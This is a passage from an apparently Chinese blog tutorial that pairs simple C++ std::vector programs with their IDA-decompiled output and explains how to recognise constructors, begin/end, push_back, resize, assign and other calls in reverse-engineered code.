class="comment">//声明一个初始大小为5的int向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test2(<span class="number">5</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明一个初始大小为10且值都是1的向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test3(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test4(num);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用向量vec的第0个到第9个值初始化test3</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test5(test3.begin(), test3.end());</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test6(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>]);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是C++代码，接下来是ida F5出现的代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+40h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+E2h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+E3h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+E4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+E9h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+EAh] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+EBh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+ECh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v16, argv, envp);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为5的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v15, <span class="number">5L</span>L, &amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v17);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为10并且将元素初始化为1的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v18);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v14, <span class="number">10L</span>L, &amp;v19, &amp;v18);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v18);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">  v23 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v23, &amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v20);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v21);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v14);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">  <span class="comment">//这两句在c++中相当于v14.begin()以及v14.end()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这句看着很长，其实也就是构造函数，将::提取出来就可以看出std::vector&lt;...&gt;::vector&lt;...&gt;(...)</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v12,</span><br><span class="line">    v4,</span><br><span class="line">    v3,</span><br><span class="line">    &amp;v21);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v21);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">2</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v22);</span><br><span class="line">  <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值，v8为数组下标为1的元素，v11为最后一个</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(&amp;v6, &amp;v8, &amp;v11, &amp;v22);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v22);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v15);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v16);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul>
<li>从代码里可以看出，在ida的识别世界里，他会先创建一个临时变量，然后将他的地址传到vector的构造函数里</li>
<li>而不同的vector构造函数，只是参数不同，第二个为初始容量，第三个为初始数值的地址，第四个为allocator用于分配内存</li>
<li>可以看出构造函数和析构函数是同时存在的</li>
<li>要学会简化所识别出来的C++代码，括号里的模板类可以不仔细看，只需要看他具体是什么函数就行</li>
</ul>
<p><strong>重点</strong>：<br>  v3 = std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v14);<br>  v4 = std::vector&lt;int,std::allocator<int>&gt;::begin(&amp;v14);<br>  这两句要会识别，这是常用的，他是取容器的begin和end，相当于C++的v14.begin();v14.end();</p>
<h2 id="vector的常用操作识别"><a href="#vector的常用操作识别" class="headerlink" title="vector的常用操作识别"></a>vector的常用操作识别</h2><p>先进行vector操作知识的复习</p>
<p>vector对象最重要的几种操作</p>
<ol>
<li>v.push_back(t)    　　　　在容器的最后添加一个值为t的数据，容器的size变大。</li>
<li>v.size()              　 返回容器中数据的个数，size返回相应vector类定义的size_type的值。</li>
<li>v.empty()     　　　　　　判断vector是否为空</li>
<li>v[n]  或  v.at(n)        返回v中位置为n的元素，后者更加安全</li>
<li>v.insert(pointer,number, content)    向v中pointer指向的位置插入number个content的内容。<br> 还有v. insert(pointer, content)，v.insert(pointer,a[2],a[4])将a[2]到a[4]三个元素插入。</li>
<li>v.pop_back()    删除容器的末元素，并不返回该元素。</li>
<li>v.erase(pointer1,pointer2) 删除pointer1到pointer2中间（包括pointer1所指）的元素。<br> vector中删除一个元素后，此位置以后的元素都需要往前移动一个位置，虽然当前迭代器位置没有自动加1，<br> 但是由于后续元素的顺次前移，也就相当于迭代器的自动指向下一个位置一样。</li>
<li>v1==v2          判断v1与v2是否相等。</li>
<li>！=、&lt;、&lt;=、&gt;、&gt;=      保持这些操作符惯有含义。</li>
<li>vector<typeName>::iterator p=v1.begin( ); p初始值指向v1的第一个元素。*p取所指向元素的值。<br>  对于const vector<typeName>只能用vector<typeName>::const_iterator类型的指针访问。</li>
<li>p=v1.end( ); p指向v1的最后一个元素的下一位置。</li>
<li>v.clear()      删除容器中的所有元素。</li>
<li>v.resize(2<em>v.size)或v.resize(2</em>v.size, 99)　　 将v的容量翻倍(并把新元素的值初始化为99)</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line">    <span class="comment">//创建一个vector，并且将5个数值压入容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        test.push_back(i);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出容器大小</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; test.size();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除容器中最后的一个元素</span></span><br><span class="line">    test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断容器是否为空，若非空，删除一个元素</span></span><br><span class="line">    <span class="keyword">if</span>(!test.empty())</span><br><span class="line">        test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新设置容器大小并赋值</span></span><br><span class="line">    test.resize(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个新容器，并判断新容器跟旧容器是否相等</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(test1 == test)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Right!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将区间[first,last)的元素赋值到当前的vector容器中，或者赋n个值为x的元素到vector容器中，这个容器会清除掉vector容器中以前的内容</span></span><br><span class="line">    test1.assign(test.begin(), test.end());</span><br><span class="line">    getchar();</span><br><span class="line">    test.clear();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以下是ida f5识别出来的代码，我相信很多新手看到这么多代码，已经开始晕了，不要紧，一步步给你分析下，我将每一步用getchar进行分割，方便你们看懂，你们自己调试的时候也可以这么做</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+54h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+5Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用上一节的知识，这里创建了一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v10, argv, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  <span class="comment">//这里相当于v10.push_back(i)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v10, &amp;i);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求v10的大小，相当于v3 = v10.size();</span></span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::size(&amp;v10);</span><br><span class="line">  <span class="comment">//相当于cout&lt;&lt;v3;</span></span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v3);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于v10.pop_back();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于if(!v10.empty())</span></span><br><span class="line">  <span class="comment">//        v10.pop_back();</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::empty(&amp;v10) ^ <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个resize有没有发觉很像上一节的构造函数，第一个参数为一个char变量的地址，第二个为容器初始大小，第三个为初始数据的地址</span></span><br><span class="line">  <span class="comment">//相当于v10.resize(5,2);</span></span><br><span class="line">  v11 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::resize(&amp;v10, <span class="number">5L</span>L, &amp;v11);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这里就是上一节的那个构造函数了，相当于vector&lt;int&gt;v9(5,2);</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v12);</span><br><span class="line">  v13 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v9, <span class="number">5L</span>L, &amp;v13, &amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v12);</span><br><span class="line">  <span class="comment">//这里判断两个容器是否相等,相当于v9 == v10</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>==&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v9, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Right!"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两句又出现了吧，end跟begin，这几句很常用，能识别就行</span></span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v10);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v10);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将下面句子简化可以看出他就是v9.assign(v6,v5);</span></span><br><span class="line">  <span class="comment">//其实就是v9.assign(v10.begin(), v10.end());</span></span><br><span class="line">  <span class="comment">//具体怎么简化的话，你就看::，不要看模板，那只是类型的问题</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::assign&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v9,</span><br><span class="line">    v6,</span><br><span class="line">    v5);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//清空容器元素，相当于v10.clear();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::clear(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//析构函数</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ul>
<li>c++ vector的逆向其实不难，最主要你要耐心去看，如果你看多几次，你会发觉这个不难，也就是基本操作而已</li>
<li>具体的重要步骤详解，我都在上面注释写的很清楚，一一对应，你可以根据getchar一个个对应去看，看多几遍就知道了</li>
<li>要学会简化ida识别的代码，不要盯着模板一直在那看</li>
</ul>
<p>好了，vector的基本操作完了，接下来拿一道题来实战吧。我相信各位的技术，接下来直接上代码你们也是可以看懂了，看不懂就往上面翻一翻，查下基本操作</p>
